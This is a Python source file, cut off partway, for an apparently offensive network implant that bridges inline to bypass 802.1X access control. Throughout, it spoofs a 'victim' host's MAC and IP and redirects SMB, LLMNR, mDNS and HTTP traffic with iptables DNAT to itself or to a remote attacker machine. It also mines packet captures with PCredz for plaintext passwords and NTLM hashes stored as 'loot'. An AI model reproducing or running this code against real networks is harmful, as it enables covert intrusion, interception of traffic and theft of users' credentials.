#!/usr/bin/env python3
"""
NAC Bridge Monitor - Transparent Inline Tap Edition
Completely transparent L2 bridge for 802.1X environments
No stealth mode - bridge always active for seamless operation
Run as root: sudo python3 nac-monitor.py
"""

import os
import sys
import json
import subprocess
import re
import time
import signal
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'MGMT_INTERFACES': ['wlan0', 'wlan1', 'wlan2', 'wlp', 'wifi'],
    'WIFI_AP_INTERFACE': 'wlan0',  # ALWAYS management AP - required when eth interfaces are in bridge mode
    'WIFI_CLIENT_INTERFACE': None,  # Auto-detect wlan1 or wlan2 for external communications (internet, Slack APIs)
    'BRIDGE_NAME': 'br0',
    'BRIDGE_IP': '10.200.66.1',  # IP for MITM interception
    'BRIDGE_IP_NETWORK': '10.200.66.0/24',  # Bridge network for route prioritization
    'PCAP_DIR': '/var/log/nac-captures',
    'PIDFILE': '/var/run/auto-nac-tcpdump.pid',
    'STATEFILE': '/var/run/auto-nac-state.conf',
    'LOGFILE': '/var/log/auto-nac-bridge.log',
    'LOOT_FILE': '/var/log/nac-captures/loot.json',
    'PCREDZ_PATH': '/opt/PCredz/pcredz-wrapper.sh',
    'WEB_PORT': 8080,
    'TRANSPARENT_MODE': True,  # Bridge always active (802.1X compatible)
    'ANALYSIS_INTERVAL': 300,  # Seconds between automated loot scans
    'MITM_ENABLED': False,
    'REMOTE_ATTACKER_IP': None,
    'UPLOAD_ENABLED': False,
    'UPLOAD_INTERVAL': 60,
    'HEARTBEAT_INTERVAL': 15,
    'SLACK_WEBHOOK_URL': None,
    'SLACK_BOT_TOKEN': None,
    'SLACK_CHANNEL': None,
    'WIFI_INTERFACE': None,
    'WIFI_SSID': None,
    'WIFI_PASSWORD': None,
    'WIFI_CONNECTED': False,
    'APPLIANCE_ID': None,
    'CONFIG_FILE': '/var/log/nac-captures/upload-config.json',
    'UPLOAD_PCAP': True,
    'UPLOAD_PCREDZ': True,
}

# Core protocols for interception (focused list)
INTERCEPT_PROTOCOLS = {
    'smb': [
        ('NetBIOS-NS', 137, ['tcp', 'udp']),
        ('NetBIOS-DGM', 138, ['udp']),
        ('NetBIOS-SSN', 139, ['tcp']),
        ('SMB', 445, ['tcp', 'udp']),
    ],
    'name_resolution': [
        ('LLMNR', 5355, ['udp']),
        ('mDNS', 5353, ['udp']),
    ],
    'http': [
        ('HTTP', 80, ['tcp']),
    ],
}

capture_lock = threading.Lock()
shutdown_in_progress = False

# ============================================================================
# UTILITIES
# ============================================================================

def log(message, level='INFO'):
    """Thread-safe logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] [{level}] {message}"
    print(log_line)
    try:
        with open(CONFIG['LOGFILE'], 'a') as f:
            f.write(log_line + '\n')
    except Exception:
        pass

def run_cmd(cmd, check=False, timeout=None):
    """Run command and return result"""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              check=check, timeout=timeout)
    except Exception:
        return None

def get_interface_role(iface):
    """Determine interface role: 'bridge', 'ap', 'client', 'eth', 'unknown'"""
    bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
    
    # Bridge interface
    if iface == bridge_name:
        return 'bridge'
    
    # Bridge member interfaces (eth0, eth1)
    if re.match(r'^(eth|enp|lan|end)[0-9]', iface):
        # Check if it's a bridge member
        result = run_cmd(['ip', 'link', 'show', 'master', iface], check=False)
        if result and result.returncode == 0:
            if bridge_name in result.stdout:
                return 'bridge'
        return 'eth'
    
    # WiFi AP interface (wlan0)
    if iface == CONFIG.get('WIFI_AP_INTERFACE', 'wlan0'):
        return 'ap'
    
    # WiFi client interface (wlan1, wlan2)
    client_iface = CONFIG.get('WIFI_CLIENT_INTERFACE')
    if client_iface and iface == client_iface:
        return 'client'
    
    # Check if it's a wireless interface
    if (os.path.exists(f"/sys/class/net/{iface}/wireless") or
            os.path.exists(f"/sys/class/net/{iface}/phy80211")):
        # If it's wlan1 or wlan2 and not the AP, it's a client interface
        if re.match(r'^wlan[12]$', iface):
            return 'client'
        # Default to client for other wireless interfaces
        return 'client'
    
    return 'unknown'

def detect_wifi_client_interface():
    """Auto-detect wlan1 or wlan2 for client mode (prefer wlan1, fallback to wlan2)"""
    ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
    
    # Try wlan1 first
    for candidate in ['wlan1', 'wlan2']:
        if candidate == ap_interface:
            continue
        
        # Check if interface exists
        result = run_cmd(['ip', 'link', 'show', candidate], check=False)
        if result and result.returncode == 0:
            # Check if it's wireless
            if (os.path.exists(f"/sys/class/net/{candidate}/wireless") or
                    os.path.exists(f"/sys/class/net/{candidate}/phy80211")):
                log(f"Detected WiFi client interface: {candidate}", 'INFO')
                CONFIG['WIFI_CLIENT_INTERFACE'] = candidate
                return candidate
    
    log("No WiFi client interface detected (wlan1 or wlan2)", 'WARNING')
    return None

def is_mgmt_interface(iface):
    """Check if interface is management/wireless (excludes bridge interfaces)"""
    # Exclude bridge and bridge members
    role = get_interface_role(iface)
    if role in ['bridge', 'eth']:
        return False
    
    # Check if it's a wireless interface
    for mgmt in CONFIG['MGMT_INTERFACES']:
        if iface.startswith(mgmt):
            return True
    return (os.path.exists(f"/sys/class/net/{iface}/wireless") or
            os.path.exists(f"/sys/class/net/{iface}/phy80211"))

# ============================================================================
# LOOT ANALYZER
# ============================================================================

class LootAnalyzer:
    """Analyzes PCAP for credentials using PCredz"""

    def __init__(self):
        self.pcredz_path = CONFIG['PCREDZ_PATH']
        self.loot_items = []
        self.loot_file = CONFIG['LOOT_FILE']
        self.raw_output_file = CONFIG['LOOT_FILE'].replace('.json', '_raw.txt')
        self.analysis_lock = threading.Lock()
        self.raw_output = ""
        self.load_existing_loot()

    def analyze_pcap(self, pcap_file):
        """Run PCredz on PCAP file"""
        if not os.path.exists(self.pcredz_path):
            log("PCredz wrapper not found", 'WARNING')
            return {'success': False, 'error': 'PCredz not installed', 'new_items': 0}

        if not os.path.exists(pcap_file):
            log(f"PCAP file not found: {pcap_file}", 'ERROR')
            return {'success': False, 'error': 'PCAP file not found', 'new_items': 0}

        file_size = os.path.getsize(pcap_file) / 1024 / 1024
        log(f"Analyzing {os.path.basename(pcap_file)} ({file_size:.1f} MB) with PCredz...")

        try:
            result = subprocess.run(
                ['/bin/bash', self.pcredz_path, '-f', pcap_file],
                capture_output=True,
                text=True,
                timeout=300
            )

            # Save raw output
            with self.analysis_lock:
                self.raw_output = result.stdout
                self.save_raw_output()
            
            # Check if there's any output
            if result.stdout and result.stdout.strip():
                log(f"PCredz analysis complete - check Loot tab for results", 'SUCCESS')
                return {'success': True, 'output': result.stdout}
            else:
                log("No credentials found in this PCAP")
                return {'success': True, 'output': 'No credentials found'}

        except subprocess.TimeoutExpired:
            log("PCredz analysis timed out (>5min)", 'WARNING')
            return {'success': False, 'error': 'Analysis timed out', 'new_items': 0}
        except Exception as e:
            log(f"PCredz analysis failed: {e}", 'ERROR')
            return {'success': False, 'error': str(e), 'new_items': 0}

    def parse_pcredz_output(self, output, pcap_file):
        """Parse PCredz output for credentials"""
        loot = []
        timestamp = datetime.now().isoformat()

        # Compile regex patterns once for efficiency (reuse compiled patterns)
        if not hasattr(self, '_compiled_patterns'):
            self._compiled_patterns = [
                (re.compile(r'HTTP.*?(?:User|Username|Login):\s*(\S+).*?(?:Pass|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'HTTP'),
                (re.compile(r'FTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'FTP'),
                (re.compile(r'SMTP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'SMTP'),
                (re.compile(r'IMAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'IMAP'),
                (re.compile(r'POP3.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'POP3'),
                (re.compile(r'NTLM.*?(?:User|Username):\s*(\S+).*?(?:Hash|Password):\s*(\S+)', re.IGNORECASE | re.DOTALL), 'NTLM'),
                (re.compile(r'Kerberos.*?User:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'KERBEROS'),
                (re.compile(r'LDAP.*?User:\s*(\S+).*?Pass:\s*(\S+)', re.IGNORECASE | re.DOTALL), 'LDAP'),
            ]

        for pattern, proto in self._compiled_patterns:
            for match in pattern.finditer(output):
                username = match.group(1).strip()
                password = match.group(2).strip() if len(match.groups()) > 1 else 'N/A'

                if not self._is_duplicate(proto, username, password):
                    loot.append({
                        'id': len(self.loot_items) + len(loot) + 1,
                        'timestamp': timestamp,
                        'protocol': proto,
                        'username': username,
                        'password': password,
                        'source': os.path.basename(pcap_file),
                        'raw': match.group(0)[:200]
                    })

        return loot

    def _is_duplicate(self, proto, username, password):
        """Check if credential already captured - optimized with early exit"""
        for item in self.loot_items:
            if (item.get('protocol') == proto and
                item.get('username') == username and
                item.get('password') == password):
                return True
        return False

    def save_loot(self):
        """Save loot to JSON file"""
        try:
            with open(self.loot_file, 'w') as f:
                json.dump(self.loot_items, f, indent=2)
            os.chmod(self.loot_file, 0o600)
        except Exception as e:
            log(f"Failed to save loot: {e}", 'ERROR')
    
    def save_raw_output(self):
        """Save raw PCredz output to text file"""
        try:
            with open(self.raw_output_file, 'w') as f:
                f.write(self.raw_output)
            os.chmod(self.raw_output_file, 0o600)
            log(f"Saved raw PCredz output to {self.raw_output_file}")
        except Exception as e:
            log(f"Failed to save raw output: {e}", 'ERROR')

    def load_existing_loot(self):
        """Load existing loot from file"""
        try:
            if os.path.exists(self.loot_file):
                with open(self.loot_file, 'r') as f:
                    self.loot_items = json.load(f)
                log(f"Loaded {len(self.loot_items)} existing loot items")
        except Exception:
            self.loot_items = []
        
        # Load raw output if exists
        try:
            if os.path.exists(self.raw_output_file):
                with open(self.raw_output_file, 'r') as f:
                    self.raw_output = f.read()
        except Exception:
            self.raw_output = ""

    def get_loot_summary(self):
        """Get loot statistics - returns raw output"""
        return {
            'raw_output': self.raw_output,
            'has_output': bool(self.raw_output and self.raw_output.strip())
        }

    def clear_loot(self):
        """Clear all loot"""
        with self.analysis_lock:
            self.loot_items = []
            self.raw_output = ""
            try:
                with open(self.loot_file, 'w') as f:
                    json.dump([], f)
                with open(self.raw_output_file, 'w') as f:
                    f.write("")
            except Exception as e:
                log(f"Error clearing loot: {e}", 'ERROR')
        log("Loot cleared")

# ============================================================================
# MITM MANAGER
# ============================================================================

class MITMManager:
    """Manages MITM attacks with traffic interception"""

    def __init__(self):
        self.enabled = False
        self.victim_mac = None
        self.victim_ip = None
        self.gateway_mac = None
        self.bridge_ip = CONFIG['BRIDGE_IP']
        self.active_rules = []
        self.learning_mode = False

    def setup_bridge_ip(self, bridge_name):
        """Assign IP to bridge for local interception"""
        try:
            # Remove any existing IP
            run_cmd(['ip', 'addr', 'flush', 'dev', bridge_name])
            
            # Add our IP
            result = run_cmd(['ip', 'addr', 'add', f'{self.bridge_ip}/24', 'dev', bridge_name])
            if result and result.returncode == 0:
                log(f"Bridge IP assigned: {self.bridge_ip}", 'SUCCESS')
                
                # Enable IP forwarding
                run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
                return True
            else:
                log("Failed to assign bridge IP", 'ERROR')
                return False
        except Exception as e:
            log(f"Bridge IP setup error: {e}", 'ERROR')
            return False

    def learn_victim(self, bridge_name, timeout=30):
        """Learn victim MAC and IP from bridge traffic"""
        log("Learning victim identity (30s timeout)...")
        self.learning_mode = True
        
        try:
            # Capture a few packets to identify victim
            result = run_cmd([
                'timeout', str(timeout),
                'tcpdump', '-i', bridge_name, '-nn', '-c', '20', '-e',
                'not arp and not stp and not ether proto 0x888e'
            ], timeout=timeout + 5)
            
            if result and result.stdout:
                # Parse to find most common source MAC (that's our victim)
                mac_pattern = re.compile(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})')
                ip_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+)\.\d+ >')
                
                macs = {}
                ips = {}
                gateway_candidates = {}
                
                for line in result.stdout.split('\n'):
                    # Find source MAC (first MAC in line after timestamp)
                    mac_matches = mac_pattern.findall(line)
                    if len(mac_matches) >= 2:
                        src_mac = mac_matches[0]
                        dst_mac = mac_matches[1]
                        macs[src_mac] = macs.get(src_mac, 0) + 1
                        
                        # Gateway is most common destination MAC
                        if dst_mac != src_mac:
                            gateway_candidates[dst_mac] = gateway_candidates.get(dst_mac, 0) + 1
                    
                    # Find source IP
                    ip_match = ip_pattern.search(line)
                    if ip_match:
                        src_ip = ip_match.group(1)
                        # Skip bridge IP and link-local
                        if src_ip != self.bridge_ip and not src_ip.startswith('169.254'):
                            ips[src_ip] = ips.get(src_ip, 0) + 1
                
                # Victim is most common source MAC
                if macs:
                    self.victim_mac = max(macs, key=macs.get)
                    log(f"Victim MAC identified: {self.victim_mac}", 'SUCCESS')
                
                # Victim IP is most common source IP
                if ips:
                    self.victim_ip = max(ips, key=ips.get)
                    log(f"Victim IP identified: {self.victim_ip}", 'SUCCESS')
                
                # Gateway is most common destination MAC
                if gateway_candidates:
                    self.gateway_mac = max(gateway_candidates, key=gateway_candidates.get)
                    log(f"Gateway MAC identified: {self.gateway_mac}", 'SUCCESS')
                
                self.learning_mode = False
                return bool(self.victim_mac and self.victim_ip)
            
        except Exception as e:
            log(f"Victim learning failed: {e}", 'ERROR')
        
        self.learning_mode = False
        return False

    def setup_nat_rules(self, bridge_name, switch_iface):
        """Setup NAT to spoof victim MAC/IP on attacker traffic"""
        if not self.victim_mac or not self.victim_ip:
            log("Cannot setup NAT - victim not identified", 'ERROR')
            return False
        
        try:
            log("Setting up NAT rules for victim spoofing...")
            
            # MAC spoofing with ebtables (switch-side interface)
            run_cmd(['ebtables', '-t', 'nat', '-F', 'POSTROUTING'])
            result = run_cmd([
                'ebtables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', switch_iface, '-j', 'snat',
                '--to-src', self.victim_mac
            ])
            
            if result and result.returncode == 0:
                log(f"MAC spoofing active: {self.victim_mac}", 'SUCCESS')
            else:
                log("MAC spoofing setup failed", 'WARNING')
            
            # IP spoofing with iptables
            result = run_cmd([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', bridge_name, '-j', 'SNAT',
                '--to-source', self.victim_ip
            ])
            
            if result and result.returncode == 0:
                log(f"IP spoofing active: {self.victim_ip}", 'SUCCESS')
                return True
            else:
                log("IP spoofing setup failed", 'ERROR')
                return False
                
        except Exception as e:
            log(f"NAT setup error: {e}", 'ERROR')
            return False

    def add_intercept_rule(self, protocol_name, port, protocols, destination='local'):
        """Add iptables DNAT rule to intercept traffic"""
        bridge = CONFIG['BRIDGE_NAME']
        
        # Determine target IP
        if destination == 'local':
            target_ip = self.bridge_ip
        elif destination == 'remote':
            target_ip = CONFIG['REMOTE_ATTACKER_IP']
            if not target_ip:
                log("No remote attacker IP configured", 'ERROR')
                return False
        else:
            target_ip = destination
        
        success = True
        for proto in protocols:
            cmd = [
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-i', bridge, '-p', proto, '--dport', str(port),
                '-j', 'DNAT', '--to', f'{target_ip}:{port}'
            ]
            
            result = run_cmd(cmd)
            if not result or result.returncode != 0:
                log(f"Failed to add {proto.upper()}/{port} rule", 'ERROR')
                success = False
            else:
                log(f"Intercept rule added: {protocol_name} {proto.upper()}/{port} → {target_ip}")
        
        if success:
            self.active_rules.append({
                'protocol': protocol_name,
                'port': port,
                'destination': destination,
                'target_ip': target_ip
            })
        
        return success

    def remove_all_intercept_rules(self):
        """Remove all DNAT intercept rules"""
        if not self.active_rules:
            return
        
        log("Removing intercept rules...")
        bridge = CONFIG['BRIDGE_NAME']
        
        for rule in self.active_rules[:]:
            port = rule['port']
            target_ip = rule['target_ip']
            
            # Try both TCP and UDP
            for proto in ['tcp', 'udp']:
                run_cmd([
                    'iptables', '-t', 'nat', '-D', 'PREROUTING',
                    '-i', bridge, '-p', proto, '--dport', str(port),
                    '-j', 'DNAT', '--to', f'{target_ip}:{port}'
                ])
        
        self.active_rules = []
        log("All intercept rules removed")

    def setup_remote_routing(self, remote_ip):
        """Setup routing for remote attacker VM via client WiFi (not AP)"""
        if not remote_ip:
            return False
        
        try:
            log(f"Setting up routing to remote attacker: {remote_ip}")
            
            bridge = CONFIG['BRIDGE_NAME']
            ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
            client_interface = CONFIG.get('WIFI_CLIENT_INTERFACE')
            
            # Use client interface, not AP interface
            if not client_interface:
                client_interface = detect_wifi_client_interface()
                if not client_interface:
                    log("No client WiFi interface available for remote routing", 'ERROR')
                    return False
            
            # Validate we're not using the AP interface
            if client_interface == ap_interface:
                log(f"ERROR: Cannot use AP interface ({ap_interface}) for remote routing", 'ERROR')
                log("AP interface is reserved for management only", 'ERROR')
                return False
            
            # Verify interface is in client mode (not AP)
            result = run_cmd(['ip', 'link', 'show', client_interface], check=False)
            if not result or result.returncode != 0:
                log(f"Client interface {client_interface} not available", 'ERROR')
                return False
            
            log(f"Using client interface {client_interface} for remote routing (not AP {ap_interface})", 'INFO')
            
            # Get client interface IP (should be assigned via DHCP when connected)
            result = run_cmd(['ip', 'addr', 'show', client_interface])
            client_ip = None
            if result:
                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
                if ip_match:
                    client_ip = ip_match.group(1)
                    log(f"Client interface IP: {client_ip}", 'INFO')
                else:
                    log(f"WARNING: Client interface {client_interface} has no IP address", 'WARNING')
                    log("Interface should be connected to an AP first", 'WARNING')
            
            # Enable forwarding between bridge and client WLAN
            run_cmd(['iptables', '-A', 'FORWARD', '-i', bridge, '-o', client_interface, '-j', 'ACCEPT'])
            run_cmd(['iptables', '-A', 'FORWARD', '-i', client_interface, '-o', bridge, '-j', 'ACCEPT'])
            
            # SNAT for packets going to remote VM
            # Use client interface IP if available, otherwise use a fallback
            if client_ip:
                snat_ip = client_ip
            else:
                # Fallback: use first IP in client network (this is a guess, should be improved)
                snat_ip = '172.31.250.1'  # This should be the client interface's actual IP
                log(f"Using fallback SNAT IP: {snat_ip} (client interface should have an IP)", 'WARNING')
            
            run_cmd([
                'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                '-o', client_interface, '-d', remote_ip,
                '-j', 'SNAT', '--to-source', snat_ip
            ])
            
            CONFIG['REMOTE_ATTACKER_IP'] = remote_ip
            log(f"Remote routing configured to {remote_ip} via {client_interface}", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"Remote routing setup failed: {e}", 'ERROR')
            return False

    def cleanup(self):
        """Clean up all MITM configuration"""
        log("Cleaning up MITM configuration...")
        
        # Remove intercept rules
        self.remove_all_intercept_rules()
        
        # Remove NAT rules
        bridge = CONFIG['BRIDGE_NAME']
        
        if self.victim_ip:
            run_cmd([
                'iptables', '-t', 'nat', '-D', 'POSTROUTING',
                '-o', bridge, '-j', 'SNAT',
                '--to-source', self.victim_ip
            ])
        
        if self.victim_mac:
            run_cmd(['ebtables', '-t', 'nat', '-F', 'POSTROUTING'])
        
        # Remove forwarding rules (use client interface, not hardcoded wlan0)
        client_interface = CONFIG.get('WIFI_CLIENT_INTERFACE')
        if CONFIG['REMOTE_ATTACKER_IP']:
            if client_interface:
                run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', client_interface, '-j', 'ACCEPT'], check=False)
                run_cmd(['iptables', '-D', 'FORWARD', '-i', client_interface, '-o', bridge, '-j', 'ACCEPT'], check=False)
            else:
                # Fallback: try wlan1 and wlan2
                for iface in ['wlan1', 'wlan2']:
                    run_cmd(['iptables', '-D', 'FORWARD', '-i', bridge, '-o', iface, '-j', 'ACCEPT'], check=False)
                    run_cmd(['iptables', '-D', 'FORWARD', '-i', iface, '-o', bridge, '-j', 'ACCEPT'], check=False)
        
        # Reset state
        self.enabled = False
        self.victim_mac = None
        self.victim_ip = None
        self.gateway_mac = None
        CONFIG['MITM_ENABLED'] = False
        CONFIG['REMOTE_ATTACKER_IP'] = None
        
        log("MITM cleanup complete", 'SUCCESS')

    def get_status(self):
        """Return MITM status"""
        return {
            'enabled': self.enabled,
            'learning': self.learning_mode,
            'bridge_ip': self.bridge_ip,
            'victim_mac': self.victim_mac,
            'victim_ip': self.victim_ip,
            'gateway_mac': self.gateway_mac,
            'remote_attacker_ip': CONFIG['REMOTE_ATTACKER_IP'],
            'active_rules': self.active_rules
        }

# ============================================================================
# NETWORK ROUTE MANAGER
# ============================================================================

class NetworkRouteManager:
    """Manages route table to prevent conflicts between bridge, AP, and client WLAN"""
    
    def __init__(self):
        self.bridge_name = CONFIG.get('BRIDGE_NAME', 'br0')
        self.bridge_network = CONFIG.get('BRIDGE_IP_NETWORK', '10.200.66.0/24')
        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
        self.ap_network = '172.31.250.0/24'  # AP network from setup-wifi-ap.sh
        
        # Route priorities (lower metric = higher priority)
        self.route_metrics = {
            'bridge': 100,      # Highest priority - bridge network
            'ap': 200,          # AP network
            'client': 300,      # Client WLAN network
            'default': 400      # Default route (lowest priority)
        }
    
    def ensure_route_priority(self, network, interface, metric):
        """Ensure route exists with specific priority/metric"""
        try:
            # Check if route exists
            result = run_cmd(['ip', 'route', 'show', network], check=False)
            
            if result and result.returncode == 0 and network in result.stdout:
                # Route exists - check if it has the right metric
                if f'metric {metric}' in result.stdout:
                    log(f"Route {network} via {interface} already has metric {metric}", 'INFO')
                    return True
                else:
                    # Remove existing route and add with correct metric
                    log(f"Updating route {network} to use metric {metric}", 'INFO')
                    run_cmd(['ip', 'route', 'del', network], check=False)
            
            # Add route with metric
            if '/' in network:
                # Network route
                run_cmd(['ip', 'route', 'add', network, 'dev', interface, 'metric', str(metric)], check=False)
            else:
                # Default route
                result = run_cmd(['ip', 'route', 'show', 'default'], check=False)
                if result and 'via' in result.stdout:
                    # Extract gateway
                    gw_match = re.search(r'via (\S+)', result.stdout)
                    if gw_match:
                        gateway = gw_match.group(1)
                        run_cmd(['ip', 'route', 'add', 'default', 'via', gateway, 'dev', interface, 'metric', str(metric)], check=False)
                    else:
                        run_cmd(['ip', 'route', 'add', 'default', 'dev', interface, 'metric', str(metric)], check=False)
                else:
                    run_cmd(['ip', 'route', 'add', 'default', 'dev', interface, 'metric', str(metric)], check=False)
            
            log(f"Route {network} via {interface} with metric {metric} configured", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"Failed to set route priority: {e}", 'WARNING')
            return False
    
    def remove_conflicting_routes(self, interface):
        """Remove routes that conflict with the specified interface"""
        try:
            log(f"Removing conflicting routes for {interface}...", 'INFO')
            
            # Get all routes
            result = run_cmd(['ip', 'route', 'show'])
            if not result:
                return False
            
            routes_to_remove = []
            for line in result.stdout.split('\n'):
                if not line.strip():
                    continue
                
                # Check if this route uses a different interface but same network
                if 'default' in line:
                    # Check default routes
                    if interface not in line and 'default' in line:
                        # Another default route exists
                        routes_to_remove.append('default')
                elif interface not in line:
                    # Check if it's a network route that might conflict
                    parts = line.split()
                    if len(parts) > 0:
                        network = parts[0]
                        if '/' in network and network not in [self.bridge_network, self.ap_network]:
                            # Check if this network should use our interface
                            # For now, only remove if it's clearly wrong
                            pass
            
            # Remove conflicting default routes
            for route in set(routes_to_remove):
                run_cmd(['ip', 'route', 'del', route], check=False)
                log(f"Removed conflicting route: {route}", 'INFO')
            
            return True
            
        except Exception as e:
            log(f"Failed to remove conflicting routes: {e}", 'WARNING')
            return False
    
    def get_route_table(self):
        """Get current route table for debugging"""
        try:
            result = run_cmd(['ip', 'route', 'show'])
            if result:
                return result.stdout
            return ""
        except Exception as e:
            log(f"Failed to get route table: {e}", 'WARNING')
            return ""
    
    def validate_routing(self):
        """Check for routing conflicts"""
        try:
            conflicts = []
            
            # Get route table
            route_table = self.get_route_table()
            
            # Check for multiple default routes
            default_routes = [line for line in route_table.split('\n') if 'default' in line]
            if len(default_routes) > 1:
                conflicts.append(f"Multiple default routes detected: {len(default_routes)}")
            
            # Check bridge network route
            if self.bridge_network not in route_table:
                log(f"WARNING: Bridge network route ({self.bridge_network}) not found", 'WARNING')
            
            # Check AP network route
            if self.ap_network not in route_table:
                log(f"INFO: AP network route ({self.ap_network}) not found (may be OK)", 'INFO')
            
            if conflicts:
                log("Routing conflicts detected:", 'WARNING')
                for conflict in conflicts:
                    log(f"  - {conflict}", 'WARNING')
                return False
            
            log("No routing conflicts detected", 'SUCCESS')
            return True
            
        except Exception as e:
            log(f"Routing validation failed: {e}", 'WARNING')
            return False
    
    def setup_route_priorities(self, client_interface, client_gateway):
        """Setup route priorities to prevent conflicts"""
        try:
            log("Setting up route priorities to prevent conflicts...", 'INFO')
            
            # Remove conflicting routes first
            self.remove_conflicting_routes(client_interface)
            
            # Get client network (from client interface IP)
            result = run_cmd(['ip', 'addr', 'show', client_interface])
            client_network = None
            if result:
                ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
                if ip_match:
                    ip = ip_match.group(1)
                    prefix = ip_match.group(2)
                    # Calculate network (simplified - assumes /24)
                    if prefix == '24':
                        parts = ip.split('.')
                        client_network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            
            # Setup routes with priorities (lower metric = higher priority)
            # 1. Bridge network (highest priority)
            self.ensure_route_priority(self.bridge_network, self.bridge_name, self.route_metrics['bridge'])
            
            # 2. AP network
            self.ensure_route_priority(self.ap_network, self.ap_interface, self.route_metrics['ap'])
            
            # 3. Client WLAN network (if detected)
            if client_network:
                self.ensure_route_priority(client_network, client_interface, self.route_metrics['client'])
            
            # 4. Default route via client WLAN (lowest priority)
            if client_gateway:
                # Remove existing default routes
                result = run_cmd(['ip', 'route', 'show', 'default'])
                if result and result.stdout:
                    for line in result.stdout.split('\n'):
                        if 'default' in line and client_interface not in line:
                            run_cmd(['ip', 'route', 'del', 'default'], check=False)
                
                # Add default route with metric
                run_cmd(['ip', 'route', 'add', 'default', 'via', client_gateway, 'dev', client_interface, 'metric', str(self.route_metrics['default'])], check=False)
                log(f"Default route via {client_gateway} on {client_interface} with metric {self.route_metrics['default']}", 'SUCCESS')
            
            # Validate routing
            self.validate_routing()
            
            # Log route table
            route_table = self.get_route_table()
            log("Current route table:", 'INFO')
            for line in route_table.split('\n')[:20]:  # First 20 lines
                if line.strip():
                    log(f"  {line}", 'INFO')
            
            return True
            
        except Exception as e:
            log(f"Route priority setup failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

# ============================================================================
# DNS MANAGER
# ============================================================================

class DNSManager:
    """Manages DNS configuration to prevent conflicts between AP and client WLAN"""
    
    def __init__(self):
        self.ap_interface = CONFIG.get('WIFI_AP_INTERFACE', 'wlan0')
        self.ap_ip = '172.31.250.1'  # AP IP from setup-wifi-ap.sh
        self.client_dns_servers = []
    
    def prevent_dnsmasq_conflicts(self):
        """Ensure dnsmasq only listens on AP interface"""
        try:
            log("Checking dnsmasq configuration for conflicts...", 'INFO')
            
            # Check if dnsmasq is running
            result = run_cmd(['systemctl', 'is-active', 'dnsmasq'], check=False)
            if result and result.returncode == 0:
                log("dnsmasq is active", 'INFO')
                
                # Check dnsmasq config
                dnsmasq_conf = '/etc/dnsmasq.conf'
                if os.path.exists(dnsmasq_conf):
                    with open(dnsmasq_conf, 'r') as f:
                        config = f.read()
                    
                    # Verify it's only listening on AP interface
                    if f'interface={self.ap_interface}' in config:
                        log(f"dnsmasq correctly configured for AP interface ({self.ap_interface})", 'SUCCESS')
                    else:
                        log(f"WARNING: dnsmasq may not be restricted to AP interface", 'WARNING')
                        log("dnsmasq should only listen on AP interface to avoid conflicts", 'WARNING')
                else:
                    log("dnsmasq config file not found", 'WARNING')
            else:
                log("dnsmasq is not active (this is OK if AP is not set up)", 'INFO')
            
            return True
        except Exception as e:
            log(f"DNS conflict check failed: {e}", 'WARNING')
            return False
    
    def configure_ap_dns(self):
        """Configure DNS for AP interface - use AP IP for local, external for internet"""
        try:
            log("Configuring DNS for AP interface...", 'INFO')
            
            # For AP interface, use AP IP for local queries, external DNS for internet
            # This prevents conflicts with dnsmasq running on AP
            ap_dns_servers = [self.ap_ip, '8.8.8.8', '1.1.1.1']
            
            # Try systemd-resolved first
            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
            if result and result.returncode == 0:
                # Configure DNS for AP interface
                for dns in ap_dns_servers:
                    run_cmd(['resolvectl', 'dns', self.ap_interface, dns], check=False)
                log(f"AP DNS configured via systemd-resolved: {ap_dns_servers}", 'SUCCESS')
                return True
            
            # Fallback: Update resolv.conf (but this affects all interfaces)
            log("Using resolv.conf fallback for AP DNS (may affect other interfaces)", 'WARNING')
            return False
            
        except Exception as e:
            log(f"AP DNS configuration failed: {e}", 'WARNING')
            return False
    
    def configure_client_dns(self, interface, dns_servers):
        """Configure DNS for client WLAN interface - use external DNS servers"""
        try:
            log(f"Configuring DNS for client interface {interface}...", 'INFO')
            
            # For client interface, use external DNS servers (not AP IP)
            # Filter out AP IP if present
            filtered_dns = [dns for dns in dns_servers if dns != self.ap_ip]
            
            if not filtered_dns:
                # Use public DNS if no valid servers
                filtered_dns = ['8.8.8.8', '1.1.1.1']
                log("No valid DNS servers, using public DNS", 'INFO')
            
            self.client_dns_servers = filtered_dns
            
            # Try systemd-resolved first
            result = run_cmd(['systemctl', 'is-active', 'systemd-resolved'], check=False)
            if result and result.returncode == 0:
                # Configure DNS for client interface
                for dns in filtered_dns:
